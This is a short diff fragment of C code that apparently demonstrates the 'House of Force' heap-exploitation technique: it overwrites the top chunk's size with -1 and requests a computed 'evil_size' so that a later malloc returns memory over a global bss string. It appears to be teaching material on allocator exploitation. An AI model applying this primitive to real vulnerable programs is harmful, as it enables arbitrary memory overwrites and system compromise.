@@ -1,0 +1,10 @@
+21  char bss_var[] = "This is a string that we want to overwrite.";
+
+36  intptr_t *p1 = malloc(256);
+40  int real_size = malloc_usable_size(p1);
+46  intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
+51  *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
+68  unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
+
+71  void *new_ptr = malloc(evil_size);
+74  void* ctr_chunk = malloc(100);
